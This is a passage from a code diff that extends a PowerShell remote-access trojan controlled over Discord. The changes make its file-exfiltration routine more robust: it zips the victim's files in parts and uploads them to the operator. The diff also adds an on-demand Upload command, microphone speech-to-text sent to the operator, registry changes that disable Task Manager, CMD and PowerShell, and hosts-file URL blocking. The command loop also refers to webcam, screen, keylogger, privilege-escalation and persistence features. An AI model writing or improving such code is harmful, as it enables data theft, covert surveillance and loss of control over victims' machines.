+                    $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
+                    
+                    foreach ($file in $files) {
+                        try {
+                            if ($zipArchive -eq $null) {
+                                $zipFilePath = "$env:temp/Exfiltration_${dateStr}_Part${index}.zip"
+                                # Supprimer le fichier s'il existe déjà
+                                if (Test-Path $zipFilePath) {
+                                    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
+                                }
+                                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+                                $fileList = @()  # Réinitialiser la liste pour cette archive
+                            }
+                            
+                            $fileSize = $file.Length
+                            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
+                                # Fermer et envoyer le ZIP actuel
+                                $zipArchive.Dispose()
+                                $zipArchive = $null
+                                
+                                if (Test-Path $zipFilePath) {
+                                    $zipInfo = Get-Item $zipFilePath
+                                    if ($zipInfo.Length -gt 0) {
+                                        # Créer un message de résumé propre pour cette archive (sans markdown complexe)
+                                        $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
+                                        $archiveSummary += "Files:`n"
+                                        
+                                        # Limiter à 15 fichiers pour éviter les messages trop longs
+                                        $filesToShow = if ($fileList.Count -le 15) { $fileList } else { $fileList[0..14] }
+                                        foreach ($f in $filesToShow) {
+                                            $sizeStr = if ($f.Size -lt 1KB) { "$($f.Size) B" } 
+                                                      elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
+                                                      else { "$([math]::Round($f.Size/1MB, 2)) MB" }
+                                            $archiveSummary += "  - $($f.Name) ($sizeStr)`n"
+                                        }
+                                        
+                                        if ($fileList.Count -gt 15) {
+                                            $archiveSummary += "  ... +$($fileList.Count - 15) more file(s)`n"
+                                        }
+                                        
+                                        # Envoyer le fichier d'abord
+                                        sendFile -sendfilePath $zipFilePath | Out-Null
+                                        Start-Sleep -Seconds 2
+                                        
+                                        # Envoyer le résumé (limiter la taille pour éviter erreurs 400)
+                                        if ($archiveSummary.Length -gt 1900) {
+                                            $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
+                                            $archiveSummary += "First 10 files:`n"
+                                            foreach ($f in $fileList[0..9]) {
+                                                $archiveSummary += "  - $($f.Name)`n"
+                                            }
+                                            if ($fileList.Count -gt 10) {
+                                                $archiveSummary += "  ... +$($fileList.Count - 10) more"
+                                            }
+                                        }
+                                        
+                                        sendMsg -Message "``$archiveSummary``"
+                                        Start-Sleep -Seconds 1
+                                    }
+                                    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
+                                }
+                                
+                                # Créer un nouveau ZIP
+                                $index++
+                                $zipFilePath = "$env:temp/Exfiltration_${dateStr}_Part${index}.zip"
+                                # S'assurer que le nouveau fichier n'existe pas
+                                if (Test-Path $zipFilePath) {
+                                    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
+                                }
+                                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
+                                $currentZipSize = 0
+                                $filesProcessed = 0
+                                $fileList = @()  # Réinitialiser la liste pour cette archive
+                            }
+                            
+                            # Créer un nom d'entrée propre (relatif au dossier de base)
+                            $entryName = $file.FullName.Substring($folder.Length + 1)
+                            # Normaliser les séparateurs de chemin pour Windows
+                            $entryName = $entryName -replace '\\', '/'
+                            
+                            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
+                            
+                            # Ajouter à la liste des fichiers de cette archive
+                            $fileList += [PSCustomObject]@{
+                                Name = $file.Name
+                                Path = $entryName
+                                Size = $fileSize
+                                Date = $file.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
+                            }
+                            
+                            $currentZipSize += $fileSize
+                            $totalFiles++
+                            $totalSize += $fileSize
+                            $filesProcessed++
+                        }
+                        catch {
+                            Write-Host "Error processing file $($file.FullName): $($_.Exception.Message)" -ForegroundColor Yellow
+                            $filesSkipped++
+                            continue
+                        }
+                    }
                 }
-                $entryName = $file.FullName.Substring($folder.Length + 1)
-                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
-                $currentZipSize += $fileSize
-                PullMsg
-                if ($response -like "kill") {
-                    sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
-                    $script:previouscmd = $response
-                    break
+                catch {
+                    Write-Host "Error searching in $folder for $extension : $($_.Exception.Message)" -ForegroundColor Yellow
+                    continue
                 }
             }
         }
+        
+        # Envoyer le dernier ZIP s'il contient des fichiers
+        if ($zipArchive -ne $null) {
+            $zipArchive.Dispose()
+            if (Test-Path $zipFilePath) {
+                $zipInfo = Get-Item $zipFilePath
+                if ($zipInfo.Length -gt 0) {
+                    # Créer un message de résumé propre pour la dernière archive (sans markdown complexe)
+                    $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
+                    $archiveSummary += "Files:`n"
+                    
+                    # Limiter à 15 fichiers pour éviter les messages trop longs
+                    $filesToShow = if ($fileList.Count -le 15) { $fileList } else { $fileList[0..14] }
+                    foreach ($f in $filesToShow) {
+                        $sizeStr = if ($f.Size -lt 1KB) { "$($f.Size) B" } 
+                                  elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
+                                  else { "$([math]::Round($f.Size/1MB, 2)) MB" }
+                        $archiveSummary += "  - $($f.Name) ($sizeStr)`n"
+                    }
+                    
+                    if ($fileList.Count -gt 15) {
+                        $archiveSummary += "  ... +$($fileList.Count - 15) more file(s)`n"
+                    }
+                    
+                    # Envoyer le fichier d'abord
+                    sendFile -sendfilePath $zipFilePath | Out-Null
+                    Start-Sleep -Seconds 2
+                    
+                    # Envoyer le résumé (limiter la taille pour éviter erreurs 400)
+                    if ($archiveSummary.Length -gt 1900) {
+                        $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
+                        $archiveSummary += "First 10 files:`n"
+                        foreach ($f in $fileList[0..9]) {
+                            $archiveSummary += "  - $($f.Name)`n"
+                        }
+                        if ($fileList.Count -gt 10) {
+                            $archiveSummary += "  ... +$($fileList.Count - 10) more"
+                        }
+                    }
+                    
+                    sendMsg -Message "``$archiveSummary``"
+                    Start-Sleep -Seconds 1
+                }
+                Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
+            }
+        }
+        
+        # Message de résumé final simplifié (sans markdown complexe pour éviter erreurs 400)
+        # Désactiver temporairement le message de résumé pour éviter les erreurs 400 répétées
+        # Le message sera envoyé uniquement en cas d'erreur ou si aucun fichier n'est trouvé
+        if ($totalFiles -eq 0) {
+            $noFilesMsg = ":octagonal_sign: Exfiltration Completed - No files found :octagonal_sign:"
+            sendMsg -Message "``$noFilesMsg``"
+        }
+        # Pour les succès, on n'envoie plus de message pour éviter les erreurs 400
+        # L'utilisateur peut voir les fichiers envoyés dans le canal Discord
     }
-    $zipArchive.Dispose()
-    sendFile -sendfilePath $zipFilePath | Out-Null
-    sleep 5
-    Remove-Item -Path $zipFilePath -Force
+    catch {
+        Write-Host "Critical error in Exfiltrate: $($_.Exception.Message)" -ForegroundColor Red
+        $errorMsg = ":octagonal_sign: Exfiltration Failed - Error: $($_.Exception.Message)"
+        # Limiter la taille du message d'erreur
+        if ($errorMsg.Length -gt 1900) {
+            $errorMsg = ":octagonal_sign: Exfiltration Failed - Error: $($_.Exception.Message.Substring(0, 1850))..."
+        }
+        sendMsg -Message "``$errorMsg``"
+        
+        # Nettoyer les fichiers ZIP en cas d'erreur
+        if ($zipArchive -ne $null) {
+            try { $zipArchive.Dispose() } catch {}
+        }
+        if (Test-Path $zipFilePath) {
+            Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
+        }
+    }
 }
 
 Function Upload {
-    param ([string[]]$Path)
-    if (Test-Path -Path $path) {
-        $extension = [System.IO.Path]::GetExtension($path)
-        if ($extension -eq ".exe" -or $extension -eq ".msi") {
-            $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
-            Add-Type -AssemblyName System.IO.Compression.FileSystem
-            [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
-            sendFile -sendfilePath $tempZipFilePath | Out-Null
-            sleep 1
-            Rm -Path $tempZipFilePath -Recurse -Force
+    param (
+        [Parameter(ValueFromRemainingArguments=$true)]
+        [string[]]$Path
+    )
+    
+    # Si aucun paramètre n'est fourni, essayer de parser depuis $args ou $input
+    if (-not $Path -or $Path.Count -eq 0) {
+        # Essayer de récupérer depuis $args si disponible
+        if ($args -and $args.Count -gt 0) {
+            $Path = $args
         }
-        else {
-            sendFile -sendfilePath $Path | Out-Null
+        # Si toujours vide, vérifier si on peut parser depuis le contexte
+        if (-not $Path -or $Path.Count -eq 0) {
+            sendMsg -Message ":octagonal_sign: ``No path provided. Usage: Upload <path> or Upload -Path <path>`` :octagonal_sign:"
+            return
+        }
+    }
+    
+    # Traiter chaque chemin fourni
+    foreach ($singlePath in $Path) {
+        if ([string]::IsNullOrWhiteSpace($singlePath)) {
+            continue
+        }
+        
+        # Nettoyer le chemin (supprimer les guillemets si présents)
+        $singlePath = $singlePath.Trim('"', "'")
+        
+        if (-not (Test-Path -Path $singlePath -ErrorAction SilentlyContinue)) {
+            $errorMsg = "Path not found: $singlePath"
+            if ($errorMsg.Length -gt 1900) {
+                $errorMsg = "Path not found: " + (Split-Path -Leaf $singlePath)
+            }
+            sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
+            continue
+        }
+        
+        try {
+            $item = Get-Item -Path $singlePath -ErrorAction Stop
+            $maxFileSize = 25MB
+            $fileName = $item.Name
+            
+            if ($item.PSIsContainer) {
+                # C'est un dossier, le zipper
+                $tempZipFilePath = [System.IO.Path]::Combine(
+                    [System.IO.Path]::GetTempPath(), 
+                    "$($item.Name)_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
+                )
+                
+                # Supprimer le fichier ZIP s'il existe déjà
+                if (Test-Path $tempZipFilePath) {
+                    Remove-Item -Path $tempZipFilePath -Force -ErrorAction SilentlyContinue
+                }
+                
+                try {
+                    Add-Type -AssemblyName System.IO.Compression.FileSystem
+                    [System.IO.Compression.ZipFile]::CreateFromDirectory($singlePath, $tempZipFilePath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+                    
+                    $zipInfo = Get-Item $tempZipFilePath
+                    if ($zipInfo.Length -gt 0) {
+                        sendFile -sendfilePath $tempZipFilePath | Out-Null
+                        Start-Sleep -Seconds 2
+                        sendMsg -Message ":white_check_mark: ``Folder uploaded: $fileName ($([math]::Round($zipInfo.Length/1MB, 2)) MB)`` :white_check_mark:"
+                    }
+                    Remove-Item -Path $tempZipFilePath -Force -ErrorAction SilentlyContinue
+                }
+                catch {
+                    $errorMsg = "Failed to zip folder: $fileName - $($_.Exception.Message)"
+                    if ($errorMsg.Length -gt 1900) {
+                        $errorMsg = "Failed to zip folder: $fileName"
+                    }
+                    sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
+                }
+            }
+            else {
+                # C'est un fichier
+                if ($item.Length -gt $maxFileSize) {
+                    sendMsg -Message ":hourglass: ``Compressing large file: $fileName ($([math]::Round($item.Length/1MB, 2)) MB)...`` :hourglass:"
+                    $tempZip = "$env:TEMP\upload_$(Get-Date -Format 'yyyyMMddHHmmss')_$(Get-Random).zip"
+                    
+                    # Supprimer le fichier ZIP s'il existe déjà
+                    if (Test-Path $tempZip) {
+                        Remove-Item -Path $tempZip -Force -ErrorAction SilentlyContinue
+                    }
+                    
+                    try {
+                        Compress-Archive -Path $singlePath -DestinationPath $tempZip -Force -CompressionLevel Optimal
+                        $zipInfo = Get-Item $tempZip
+                        if ($zipInfo.Length -gt 0) {
+                            sendFile -sendfilePath $tempZip | Out-Null
+                            Start-Sleep -Seconds 2
+                            sendMsg -Message ":white_check_mark: ``File uploaded: $fileName ($([math]::Round($zipInfo.Length/1MB, 2)) MB compressed)`` :white_check_mark:"
+                        }
+                        Remove-Item -Path $tempZip -Force -ErrorAction SilentlyContinue
+                    }
+                    catch {
+                        $errorMsg = "Failed to compress: $fileName - $($_.Exception.Message)"
+                        if ($errorMsg.Length -gt 1900) {
+                            $errorMsg = "Failed to compress: $fileName"
+                        }
+                        sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
+                    }
+                }
+                else {
+                    sendFile -sendfilePath $singlePath | Out-Null
+                    Start-Sleep -Seconds 1
+                    sendMsg -Message ":white_check_mark: ``File uploaded: $fileName ($([math]::Round($item.Length/1MB, 2)) MB)`` :white_check_mark:"
+                }
+            }
+        }
+        catch {
+            $errorMsg = "Error uploading: $singlePath - $($_.Exception.Message)"
+            if ($errorMsg.Length -gt 1900) {
+                $errorMsg = "Error uploading: " + (Split-Path -Leaf $singlePath)
+            }
+            sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
         }
     }
 }
 
 Function SpeechToText {
-    Add-Type -AssemblyName System.Speech
-    $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-    $grammar = New-Object System.Speech.Recognition.DictationGrammar
-    $speech.LoadGrammar($grammar)
-    $speech.SetInputToDefaultAudioDevice()
-    
-    while ($true) {
-        $result = $speech.Recognize()
-        if ($result) {
-            $results = $result.Text
-            Write-Output $results
-            sendMsg -Message "``````$results``````"
+    try {
+        Add-Type -AssemblyName System.Speech -ErrorAction Stop
+        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine -ErrorAction Stop
+        $grammar = New-Object System.Speech.Recognition.DictationGrammar -ErrorAction Stop
+        $speech.LoadGrammar($grammar)
+        $speech.SetInputToDefaultAudioDevice()
+        
+        sendMsg -Message ":microphone: ``Speech-to-Text started. Say 'kill' to stop.`` :microphone:"
+        
+        while ($true) {
+            try {
+                $result = $speech.Recognize()
+                if ($result -and $result.Text) {
+                    $results = $result.Text.Trim()
+                    if (-not [string]::IsNullOrWhiteSpace($results)) {
+                        Write-Output $results
+                        # Nettoyer le texte et limiter la taille
+                        $cleanResults = $results -replace "[\x00-\x1F]", ""
+                        if ($cleanResults.Length -gt 1900) {
+                            $cleanResults = $cleanResults.Substring(0, 1900) + "..."
+                        }
+                        sendMsg -Message ":microphone: ``$cleanResults`` :microphone:"
+                    }
+                }
+            }
+            catch {
+                # Ignorer les erreurs de reconnaissance silencieuses
+            }
+            
+            PullMsg
+            if ($response -like "*kill*") {
+                $script:previouscmd = $response
+                sendMsg -Message ":stop_sign: ``Speech-to-Text stopped`` :stop_sign:"
+                break
+            }
         }
-        PullMsg
-        if ($response -like "kill") {
-            $script:previouscmd = $response
-            break
-        }
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to start Speech-to-Text: $($_.Exception.Message)`` :octagonal_sign:"
     }
 }
 
@@ -1257,6 +2261,321 @@ Function DisableIO {
     Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
     [Win32Functions.User32]::BlockInput($true)
     sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
+}
+
+# --------------------------------------------------------------- SYSTEM RESTRICTION FUNCTIONS ------------------------------------------------------------------------
+
+Function DisableTaskManager {
+    try {
+        # Vérifier les droits admin
+        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+        
+        if ($isAdmin) {
+            # Utiliser HKLM pour tous les utilisateurs
+            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force -ErrorAction Stop
+        }
+        else {
+            # Utiliser HKCU pour l'utilisateur actuel seulement
+            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force -ErrorAction Stop
+        }
+        
+        sendMsg -Message ":white_check_mark: ``Task Manager disabled`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to disable Task Manager: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function EnableTaskManager {
+    try {
+        # Vérifier les droits admin
+        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+            sendMsg -Message ":octagonal_sign: ``Administrator privileges required to enable Task Manager`` :octagonal_sign:"
+            return
+        }
+        
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        if (Test-Path $regPath) {
+            Remove-ItemProperty -Path $regPath -Name "DisableTaskMgr" -ErrorAction Stop
+            sendMsg -Message ":white_check_mark: ``Task Manager enabled`` :white_check_mark:"
+        }
+        else {
+            sendMsg -Message ":white_check_mark: ``Task Manager is already enabled`` :white_check_mark:"
+        }
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to enable Task Manager: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function DisableCMD {
+    try {
+        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+        
+        if ($isAdmin) {
+            # Utiliser HKLM pour tous les utilisateurs
+            $regPath = "HKLM:\Software\Policies\Microsoft\Windows\System"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath -Name "DisableCMD" -Value 2 -Type DWord -Force -ErrorAction Stop
+        }
+        else {
+            # Utiliser HKCU pour l'utilisateur actuel seulement
+            $regPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath -Name "DisableCMD" -Value 2 -Type DWord -Force -ErrorAction Stop
+        }
+        
+        sendMsg -Message ":white_check_mark: ``CMD disabled`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to disable CMD: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function EnableCMD {
+    try {
+        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+        $removed = $false
+        
+        if ($isAdmin) {
+            # Vérifier et supprimer depuis HKLM
+            $regPath = "HKLM:\Software\Policies\Microsoft\Windows\System"
+            if (Test-Path $regPath) {
+                $prop = Get-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction SilentlyContinue
+                if ($prop) {
+                    Remove-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction Stop
+                    $removed = $true
+                }
+            }
+        }
+        
+        # Toujours vérifier HKCU aussi
+        $regPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
+        if (Test-Path $regPath) {
+            $prop = Get-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction SilentlyContinue
+            if ($prop) {
+                Remove-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction Stop
+                $removed = $true
+            }
+        }
+        
+        if ($removed) {
+            sendMsg -Message ":white_check_mark: ``CMD enabled`` :white_check_mark:"
+        }
+        else {
+            sendMsg -Message ":white_check_mark: ``CMD is already enabled`` :white_check_mark:"
+        }
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to enable CMD: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function DisablePowerShell {
+    try {
+        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+        
+        if ($isAdmin) {
+            # Utiliser HKLM pour tous les utilisateurs
+            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
+            
+            $regPath2 = "HKLM:\Software\Policies\Microsoft\Windows\System"
+            if (-not (Test-Path $regPath2)) {
+                New-Item -Path $regPath2 -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
+        }
+        else {
+            # Utiliser HKCU pour l'utilisateur actuel seulement
+            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
+            
+            $regPath2 = "HKCU:\Software\Policies\Microsoft\Windows\System"
+            if (-not (Test-Path $regPath2)) {
+                New-Item -Path $regPath2 -Force | Out-Null
+            }
+            Set-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
+        }
+        
+        sendMsg -Message ":white_check_mark: ``PowerShell disabled`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to disable PowerShell: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function EnablePowerShell {
+    try {
+        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
+        $removed = $false
+        
+        if ($isAdmin) {
+            # Vérifier et supprimer depuis HKLM
+            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            if (Test-Path $regPath) {
+                $prop = Get-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+                if ($prop) {
+                    Remove-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+                    $removed = $true
+                }
+            }
+            
+            $regPath2 = "HKLM:\Software\Policies\Microsoft\Windows\System"
+            if (Test-Path $regPath2) {
+                $prop = Get-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+                if ($prop) {
+                    Remove-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+                    $removed = $true
+                }
+            }
+        }
+        
+        # Toujours vérifier HKCU aussi
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        if (Test-Path $regPath) {
+            $prop = Get-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+            if ($prop) {
+                Remove-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+                $removed = $true
+            }
+        }
+        
+        $regPath2 = "HKCU:\Software\Policies\Microsoft\Windows\System"
+        if (Test-Path $regPath2) {
+            $prop = Get-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+            if ($prop) {
+                Remove-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
+                $removed = $true
+            }
+        }
+        
+        if ($removed) {
+            sendMsg -Message ":white_check_mark: ``PowerShell enabled`` :white_check_mark:"
+        }
+        else {
+            sendMsg -Message ":white_check_mark: ``PowerShell is already enabled`` :white_check_mark:"
+        }
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to enable PowerShell: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+# --------------------------------------------------------------- URL FUNCTIONS ------------------------------------------------------------------------
+
+Function OpenURL {
+    param ([string]$Url)
+    
+    try {
+        if ([string]::IsNullOrWhiteSpace($Url)) {
+            sendMsg -Message ":octagonal_sign: ``No URL provided. Usage: OpenURL -Url http://example.com`` :octagonal_sign:"
+            return
+        }
+        
+        # Valider le format de l'URL
+        if ($Url -notmatch '^https?://') {
+            $Url = "http://$Url"
+        }
+        
+        Start-Process $Url -ErrorAction Stop
+        sendMsg -Message ":white_check_mark: ``URL opened: $Url`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to open URL: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function BlockURL {
+    param ([string]$Url)
+    
+    try {
+        if ([string]::IsNullOrWhiteSpace($Url)) {
+            sendMsg -Message ":octagonal_sign: ``No URL provided. Usage: BlockURL -Url example.com`` :octagonal_sign:"
+            return
+        }
+        
+        # Vérifier les droits admin (nécessaire pour modifier hosts)
+        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+            sendMsg -Message ":octagonal_sign: ``Administrator privileges required to block URLs`` :octagonal_sign:"
+            return
+        }
+        
+        # Nettoyer l'URL (enlever http://, https://, www.)
+        $domain = $Url -replace '^https?://', '' -replace '^www\.', '' -replace '/.*$', ''
+        
+        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
+        $hostsContent = Get-Content $hostsPath -ErrorAction Stop
+        
+        # Vérifier si déjà bloqué
+        if ($hostsContent -match "127\.0\.0\.1\s+$domain") {
+            sendMsg -Message ":octagonal_sign: ``URL already blocked: $domain`` :octagonal_sign:"
+            return
+        }
+        
+        # Ajouter l'entrée dans hosts
+        Add-Content -Path $hostsPath -Value "127.0.0.1 $domain" -ErrorAction Stop
+        sendMsg -Message ":white_check_mark: ``URL blocked: $domain`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to block URL: $($_.Exception.Message)`` :octagonal_sign:"
+    }
+}
+
+Function UnblockURL {
+    param ([string]$Url)
+    
+    try {
+        if ([string]::IsNullOrWhiteSpace($Url)) {
+            sendMsg -Message ":octagonal_sign: ``No URL provided. Usage: UnblockURL -Url example.com`` :octagonal_sign:"
+            return
+        }
+        
+        # Vérifier les droits admin
+        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+            sendMsg -Message ":octagonal_sign: ``Administrator privileges required to unblock URLs`` :octagonal_sign:"
+            return
+        }
+        
+        # Nettoyer l'URL
+        $domain = $Url -replace '^https?://', '' -replace '^www\.', '' -replace '/.*$', ''
+        
+        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
+        $hostsContent = Get-Content $hostsPath -ErrorAction Stop
+        
+        # Supprimer les lignes contenant ce domaine (avec échappement)
+        $escapedDomain = [regex]::Escape($domain)
+        $newContent = $hostsContent | Where-Object { $_ -notmatch "127\.0\.0\.1\s+$escapedDomain" }
+        
+        if ($newContent.Count -eq $hostsContent.Count) {
+            sendMsg -Message ":octagonal_sign: ``URL not found in block list: $domain`` :octagonal_sign:"
+            return
+        }
+        
+        Set-Content -Path $hostsPath -Value $newContent -ErrorAction Stop
+        sendMsg -Message ":white_check_mark: ``URL unblocked: $domain`` :white_check_mark:"
+    }
+    catch {
+        sendMsg -Message ":octagonal_sign: ``Failed to unblock URL: $($_.Exception.Message)`` :octagonal_sign:"
+    }
 }
 
 # =============================================================== MAIN FUNCTIONS =========================================================================
@@ -2455,12 +3774,12 @@ while ($true) {
     if ($latestMessageId -ne $lastMessageId) {
         $lastMessageId = $latestMessageId
         $global:latestMessageContent = $messages
-        $camrunning = Get-Job -Name Webcam
-        $sceenrunning = Get-Job -Name Screen
-        $audiorunning = Get-Job -Name Audio
-        $PSrunning = Get-Job -Name PSconsole
-        $lootrunning = Get-Job -Name Info
-        $keysrunning = Get-Job -Name Keys
+        $camrunning = Get-Job -Name Webcam -ErrorAction SilentlyContinue
+        $sceenrunning = Get-Job -Name Screen -ErrorAction SilentlyContinue
+        $audiorunning = Get-Job -Name Audio -ErrorAction SilentlyContinue
+        $PSrunning = Get-Job -Name PSconsole -ErrorAction SilentlyContinue
+        $lootrunning = Get-Job -Name Info -ErrorAction SilentlyContinue
+        $keysrunning = Get-Job -Name Keys -ErrorAction SilentlyContinue
         if ($messages -eq 'webcam') {
             sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakePhoto' command for manual camera capture`` :no_entry:"
         }
@@ -2528,7 +3847,7 @@ while ($true) {
             $duration = [int]$matches[1]
             RecordAudioClip -Duration $duration
         }
-        elseif ($messages -match '^(?i)(IsAdmin|Elevate|RemovePersistance|AddPersistance|TakePhoto|TakeScreenshot)$') {
+        elseif ($messages -match '^(?i)(IsAdmin|Elevate|RemovePersistance|AddPersistance|TakePhoto|TakeScreenshot|DisableTaskManager|EnableTaskManager|DisableCMD|EnableCMD|DisablePowerShell|EnablePowerShell)$') {
             $cmdName = $matches[1]
             if ($cmdName -eq 'IsAdmin') { IsAdmin }
             elseif ($cmdName -eq 'Elevate') { Elevate }
@@ -2536,6 +3855,77 @@ while ($true) {
             elseif ($cmdName -eq 'AddPersistance') { AddPersistance }
             elseif ($cmdName -eq 'TakePhoto') { TakePhoto }
             elseif ($cmdName -eq 'TakeScreenshot') { TakeScreenshot }
+            elseif ($cmdName -eq 'DisableTaskManager') { DisableTaskManager }
+            elseif ($cmdName -eq 'EnableTaskManager') { EnableTaskManager }
